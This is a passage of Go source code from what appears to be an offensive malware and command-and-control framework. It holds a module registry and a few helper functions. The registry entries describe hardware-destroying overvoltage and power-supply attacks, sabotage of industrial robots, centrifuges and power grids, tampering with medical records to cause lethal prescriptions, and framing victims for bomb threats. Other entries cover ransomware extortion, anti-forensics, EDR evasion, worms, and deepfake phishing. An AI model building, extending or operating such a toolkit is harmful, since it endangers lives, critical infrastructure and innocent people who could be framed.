		{Name: "v28/keyboard_led", Type: "v28", Description: "Keyboard LED exfiltration: Morse optical via Caps/Scroll/Num Lock LEDs for air-gapped data leak", CVE: "", Rank: "great", OS: "any"},
		{Name: "v28/zombie_army", Type: "v28", Description: "Zombie army political: coordinated social media smear campaigns across 5 platforms", CVE: "", Rank: "great", OS: "any"},
		{Name: "v28/legacy_poison", Type: "v28", Description: "Legacy poison: frame victim for illegal activities (forums, bomb threats, darknet domains)", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "v28/seo_sabotage", Type: "v28", Description: "SEO sabotage: generate fake sites with illegal content positioned via black-hat SEO against victim brand", CVE: "", Rank: "great", OS: "any"},
		{Name: "v28/fake_vulns", Type: "v28", Description: "Fake vulnerability injection: plant trap code in repos that triggers real 0-day when exploited", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "v28/inception_hv", Type: "v28", Description: "Inception hypervisor: nested virtualization layers (matrioska) - removing one reveals another", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "v28/isp_bgp", Type: "v28", Description: "ISP BGP subversion: hijack border gateway prefixes to redirect traffic at Internet scale", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "v28/anti_attribution", Type: "v28", Description: "Anti-attribution clone: replicate victim's digital identity to frame them as the attacker", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "v28/power_grid_harmonics", Type: "v28", Description: "Power grid harmonics injection: resonant frequencies to overheat and destroy transformers", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "v28/time_lock", Type: "v28", Description: "Time-lock extortion: 30-minute exact payment window or permanent key destruction", CVE: "", Rank: "great", OS: "any"},
		{Name: "v28/vr_spyware", Type: "v28", Description: "VR spyware: passthrough camera hijack + subliminal ransomware messages in VR headsets", CVE: "", Rank: "great", OS: "any"},
		{Name: "v28/global_ai_poison", Type: "v28", Description: "Global AI dataset poison: upload backdoored samples to HuggingFace/Kaggle/OpenML", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "v28/cdn_injection", Type: "v28", Description: "CDN malware injection: hijack Cloudflare/Akamai/Fastly to serve malware via victim's own website", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "v28/bio_cyber_dna", Type: "v28", Description: "Bio-cyber DNA attack: alter synthetic DNA order sequences to produce dangerous compounds", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "v28/browser_parasite", Type: "v28", Description: "Browser parasite: install hidden extension capturing all credentials across Chrome/Firefox/Edge", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "v28/fake_documents", Type: "v28", Description: "Fake documents generator: forge purchase orders/board resolutions with stolen watermarks", CVE: "", Rank: "great", OS: "any"},
		{Name: "v28/sound_panic", Type: "v28", Description: "Sound panic attack: trigger fire alarms/evacuation/active shooter alerts via IP speakers", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "v28/emotional_encrypt", Type: "v28", Description: "Emotional encryption: identify and encrypt sentimental files (baby photos, theses, diaries)", CVE: "", Rank: "great", OS: "any"},
		{Name: "v28/false_redemption", Type: "v28", Description: "False redemption: fake decryptor that installs permanent backdoor while appearing to restore files", CVE: "", Rank: "excellent", OS: "any"},
		// v2.9: Hardware Destruction + Industrial Sabotage + Absolute Compromise (27 modules)
		{Name: "v29/hdd_firmware_destroy", Type: "v29", Description: "HDD/SSD firmware destruction: head melt, NAND overprovision unlock, LBA table obliteration", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "v29/vrm_overvoltage", Type: "v29", Description: "VRM overvoltage: I2C/SMBus lethal voltage (2.5V RAM, 2.1V CPU), fries hardware in seconds", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "v29/acoustic_resonance", Type: "v29", Description: "Acoustic HDD resonance: speaker-generated frequencies match platter resonance, head crash", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "v29/psu_corrupt", Type: "v29", Description: "PSU firmware corruption: disable overcurrent/overtemp protection, fire/explosion risk", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "v29/usb_killer", Type: "v29", Description: "USB Killer mode: software-activated high-voltage discharge fries connected peripherals", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "v29/robot_sabotage", Type: "v29", Description: "Robot sabotage: KUKA/ABB/Fanuc trajectory override for collision + self-destruction", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "v29/centrifuge_resonance", Type: "v29", Description: "Centrifuge resonance: VFD frequency override to shaft-breaking resonance speed", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "v29/ui_shell_fake", Type: "v29", Description: "OS UI falsification: replace explorer.exe with malware-controlled replica, every click = malware", CVE: "", Rank: "great", OS: "Windows"},
		{Name: "v29/deepfake_hallucinate", Type: "v29", Description: "Real-time deepfake hallucinations: fake colleagues in video calls, phantom audio whispers", CVE: "", Rank: "great", OS: "any"},
		{Name: "v29/network_ghosts", Type: "v29", Description: "Network ghosts: spawn phantom employee devices generating incriminating traffic/logs", CVE: "", Rank: "great", OS: "any"},
		{Name: "v29/medical_tamper", Type: "v29", Description: "Medical record tampering: alter allergies/doses/lab results, cause lethal prescriptions", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "v29/intel_me_flash", Type: "v29", Description: "Intel ME/AMD PSP flash: firmware implant outside OS scope, full memory access", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "v29/smm_handler", Type: "v29", Description: "SMM handler installation: periodic SMI handler more privileged than hypervisor", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "v29/microcode_corrupt", Type: "v29", Description: "CPU microcode downgrade via Plundervolt/CVE-2020-0549 to exploitable silicon state", CVE: "CVE-2020-0549", Rank: "excellent", OS: "any"},
		{Name: "v29/nic_persist", Type: "v29", Description: "NIC firmware persistence: backdoor inside NIC chip, DMA reinjection on agent removal", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "v29/mft_bitmap", Type: "v29", Description: "MFT+Bitmap corruption: mark original sectors free, overwrite with garbage, zero recovery", CVE: "", Rank: "excellent", OS: "Windows"},
		{Name: "v29/backup_prune", Type: "v29", Description: "Backup chain prune: corrupt oldest Veeam chain base, all increments become useless", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "v29/journal_poison", Type: "v29", Description: "Filesystem journal poison: fill ext4/XFS journal with corrupt entries, kernel panic on mount", CVE: "", Rank: "excellent", OS: "Linux"},
		{Name: "v29/dns_poison", Type: "v29", Description: "DNS cache poison: redirect Windows Update/Ubuntu to trojanized updates server", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "v29/bgp_phantom", Type: "v29", Description: "BGP phantom ISP: announce fake routes to hijack branch office traffic MPLS-wide", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "v29/ldap_intermittent", Type: "v29", Description: "LDAP/Kerberos intermittent: 10s downtime every 5min, SOC exhaustion attack", CVE: "", Rank: "great", OS: "any"},
		{Name: "v29/digital_thermite", Type: "v29", Description: "Digital thermite: zero memory + force BSOD on forensic analysis detection", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "v29/honey_token", Type: "v29", Description: "Honey token detection: detect bait files, trigger 72h agent-wide silence", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "v29/access_log_wipe", Type: "v29", Description: "Access log wipe: delete physical building entry/exit records, remove physical presence evidence", CVE: "", Rank: "excellent", OS: "any"},
		// v2.10: Apocalipsis + Phantom Evasion
		{Name: "v210/apocalipsis", Type: "v210", Description: "APOCALIPSIS: core destroy (MBR+firmware+VRM+USB+BSOD) + multi-vector worm (6 vectors) + P2P botnet (Kademlia DHT) + hybrid crypto (Kyber+X25519+XChaCha20) + 12 extra evil ideas", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "v210/phantom_evasion", Type: "v210", Description: "PHANTOM 6-layer evasion: static (packer/crypter/code_cave) + disable enemy (AMSI/ETW/unhook) + Hell's Gate syscalls + sandbox detect (RAM/disk/VM/cpu/uptime/debug) + process blending (hollowing/LOLBins) + live mutation (30min cycle)", CVE: "", Rank: "excellent", OS: "any"},
		// FASE 1: EVASIÓN + ANTI-FORENSE
		{Name: "evasion/byovd_loader", Type: "evasion", Description: "BYOVD loader: WinRing0, Gdrv, RTCore64, kprocesshacker, cpuz — IOCTLs, R/W phys memory, MSR", CVE: "", Rank: "excellent", OS: "Windows"},
		{Name: "evasion/dkom", Type: "evasion", Description: "DKOM: hide processes via ActiveProcessLinks unlink, steal SYSTEM token, EPROCESS offsets", CVE: "", Rank: "excellent", OS: "Windows"},
		{Name: "evasion/anti_reversing", Type: "evasion", Description: "Anti-reversing: HW BP detect (DR0-DR7), INT3 scan, CRC integrity, RDTSC timing, sandbox/Virtual MAC check", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "evasion/anti_forensics_adv", Type: "evasion", Description: "Anti-forensics advanced: VAD hide, DoD 7-pass wipe, MFT/bitmap corruption, crash dump disable, event log/prefetch/USN/shellbag wipe", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "evasion/wer_persistence", Type: "evasion", Description: "WER persistence: Hangs hijack, Silent Process Exit, startup/run key/schtasks triple persistence", CVE: "", Rank: "excellent", OS: "Windows"},
		{Name: "evasion/mft_slack", Type: "evasion", Description: "MFT slack storage: read/write in MFT slack space, AES-GCM encrypt, hide agent fragments/ransom notes", CVE: "", Rank: "excellent", OS: "Windows"},
		{Name: "evasion/wfp_dns_poison", Type: "evasion", Description: "WFP DNS poisoning: WFP provider + netsh fallback, fake DNS server (UDP 53), hosts injection, cache flush", CVE: "", Rank: "excellent", OS: "Windows"},
		{Name: "evasion/blue_pill", Type: "evasion", Description: "Blue Pill Lite hypervisor: VMXON/VMCS VT-x, PatchGuard bypass, CPUID trap, memory hide", CVE: "", Rank: "excellent", OS: "Windows"},
		{Name: "evasion/lolbin_chainer", Type: "evasion", Description: "LOLBin dynamic chain: 28 bins (20 Win + 8 Linux), random chain per hour, multi-layer base64 encoding", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "evasion/wfp_kernel_dns", Type: "evasion", Description: "Kernel DNS driver: NDIS filter, block Defender updates, intercept Windows Updates, DNS->C2 redirect", CVE: "", Rank: "excellent", OS: "Windows"},
		// FASE 2: C2 HARDENED
		{Name: "c2/spiffe_mtls", Type: "c2", Description: "SPIFFE mTLS: SVID generation, trust bundle, peer SPIFFE ID verification, cert rotation", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "c2/multi_channel", Type: "c2", Description: "Multi-channel C2: gRPC->WebSocket->DoH->Twitter->Blockchain, health check, auto-failover, beacon loop", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "c2/ed25519", Type: "c2", Description: "Ed25519 signing: command sign/verify, nonce replay protection, trusted key ring, batch ops", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "c2/dashboard_ops", Type: "c2", Description: "Dashboard operations: HTTP+WS API, agent nodes, propagation map, signed command issuance", CVE: "", Rank: "great", OS: "any"},
		{Name: "c2/kyber_hybrid", Type: "c2", Description: "Kyber-1024 + X25519 hybrid KEM: post-quantum KEM, AES-256-GCM + HMAC-SHA256 sessions", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "c2/proto_obfuscate", Type: "c2", Description: "Proto obfuscation: XOR+AES-CTR+GZIP, integrity verification, vaporize buffers, embedded loader", CVE: "", Rank: "great", OS: "any"},
		// FASE 3: PROPAGACIÓN AVANZADA
		{Name: "hydra/ultrasound", Type: "hydra", Description: "Ultrasound QPSK worm: >18kHz modulation, WAV generation, speaker/mic RX/TX, arecord receiver", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "hydra/powerline", Type: "hydra", Description: "Powerline PLC worm: HomePlug scan, UPnP SSDP, SOAP injection, port mapping over electrical grid", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "hydra/usb_adb", Type: "hydra", Description: "USB ADB worm: ADB devices, APK install, shell exec, SMS/contacts dump, sdcard persistence", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "hydra/dns_rebinding", Type: "hydra", Description: "DNS rebinding: TTL=0 rebind, SOP bypass JS payload, SSRF lateral via Host headers", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "hydra/cicd_webhooks", Type: "hydra", Description: "CI/CD webhooks: GitHub Actions/Jenkins/GitLab CI injection, artifact propagation, 10 env scanner", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "hydra/vlan_jump", Type: "hydra", Description: "VLAN jump: double tagging, DTP negotiation, ARP flood, DHCP discover per VLAN interface", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "hydra/qr_worm", Type: "hydra", Description: "QR dynamic worm: QR matrix generation, PNG rendering, rotation channel, finder/timing patterns", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "hydra/pjl_worm", Type: "hydra", Description: "PJL worm: printer job language exploits, NVRAM read/write, firmware infect, PCL ransom note", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "propagation/chronos_ntp", Type: "propagation", Description: "Chronos NTP manipulation: fake NTP server, time forward/rewind, scheduled task shift, w32tm hijack", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "propagation/reflective_dll", Type: "propagation", Description: "Reflective DLL NASM: NtCreateSection+NtMapViewOfSection, 100-byte stager, remote thread injection", CVE: "", Rank: "excellent", OS: "Windows"},
		{Name: "propagation/kerberos_del", Type: "propagation", Description: "Kerberos delegation abuse: unconstrained delegation discovery, coercion, TGT dump, Silver Ticket", CVE: "", Rank: "excellent", OS: "Windows"},
		{Name: "propagation/imdsv2_bypass", Type: "propagation", Description: "IMDSv2 bypass: token acquisition, IAM extraction, SSRF exploit, neighbor instance scan, STS AssumeRole", CVE: "", Rank: "excellent", OS: "any"},
		// FASE 4: IA + CROSS-PLATFORM
		{Name: "loader/cross_platform", Type: "loader", Description: "Cross-platform loader: ELF/Mach-O/APK generation, pack+encrypt, syscall hooks, anti-sandbox", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "ai/jit_polymorphism", Type: "ai", Description: "JIT polymorphism: NOP-sleds, constant obfuscation, code crossover, register reordering, runtime mutation loop", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "ai/orchestrator", Type: "ai", Description: "AI FSM orchestrator: Q-learning state transitions, exploration/exploitation, risk prediction, Q-table", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "ai/federated_learn", Type: "ai", Description: "Federated learning hivemind: FedAvg aggregation, victim profiling, optimal phishing time prediction", CVE: "", Rank: "great", OS: "any"},
		{Name: "ai/autofactory", Type: "ai", Description: "Autofactory fuzzer: AFL++ integration, 9 mutation strategies, crash detection, exploit candidates", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "bridge/wazero", Type: "bridge", Description: "Wazero bridge: WASM module parsing, TinyGo compilation, Python handler migration to WASM", CVE: "", Rank: "great", OS: "any"},
		{Name: "rf_contagion/baseband", Type: "rf", Description: "RF contagion: SDR detection (RTLSDR/HackRF), ModemManager, baseband injection, IMSI capture, SS7", CVE: "", Rank: "excellent", OS: "Linux"},
		{Name: "ai/deepfake_vishing", Type: "ai", Description: "Deepfake vishing: Coqui TTS voice cloning, VoIP calls, SMS phishing, social engineering profiling", CVE: "", Rank: "excellent", OS: "any"},
	}
}

// GetBridgeClient returns the Python bridge client for module execution.
func (s *AppState) GetBridgeClient() dispatch.BridgeCaller {
	return s.Bridge
}

// AddVulnerability adds a discovered vulnerability (compat alias).
func (s *AppState) AddVulnerability(v *types.Vulnerability) {
	s.AddVuln(v)
}

// ============================================================
// HELPERS
// ============================================================

var _ = os.Stdout // keep os import

func truncateStr(s string, max int) string {
	runes := []rune(s)
	if len(runes) <= max {
		return s
	}
	return string(runes[:max]) + "..."
}
